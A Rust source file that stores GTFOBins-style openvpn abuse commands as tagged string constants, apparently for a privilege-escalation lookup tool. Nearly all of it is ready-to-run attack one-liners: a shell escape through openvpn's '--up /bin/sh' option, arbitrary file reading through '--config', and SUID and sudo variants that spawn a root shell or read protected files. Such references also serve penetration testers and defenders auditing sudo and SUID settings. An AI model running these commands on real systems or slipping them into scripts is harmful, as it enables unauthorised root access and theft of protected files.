pub static BIN_NAME: &'static str = "openvpn";
pub static SH_CODE: &'static str = r#"
    
    openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
"#;
pub static FR_DESC: &'static str =
    "The file is actually parsed and the first partial wrong line is returned on error message.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    openvpn --config "$LFILE"
"#;
pub static SUID_CODE_1: &'static str = r#"
    
    sudo install -m =xs $(which openvpn) .

    ./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
"#;
pub static SUID_DESC_2: &'static str =
    "The file is actually parsed and the first partial wrong line is returned on error message.";
pub static SUID_CODE_2: &'static str = r#"
    
    sudo install -m =xs $(which openvpn) .

    LFILE=file_to_read
    ./openvpn --config "$LFILE"
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
"#;
pub static SUDO_DESC_2: &'static str =
    "The file is actually parsed and the first partial wrong line is returned on error message.";
pub static SUDO_CODE_2: &'static str = r#"
    
    LFILE=file_to_read
    sudo openvpn --config "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID_1: Code<'static> = Code {
    title: "SUID_CODE_1",
    code: SUID_CODE_1,
    tag: Tag::SUID,
};
pub static SUID_2: Code<'static> = Code {
    title: "SUID_CODE_2",
    code: SUID_CODE_2,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
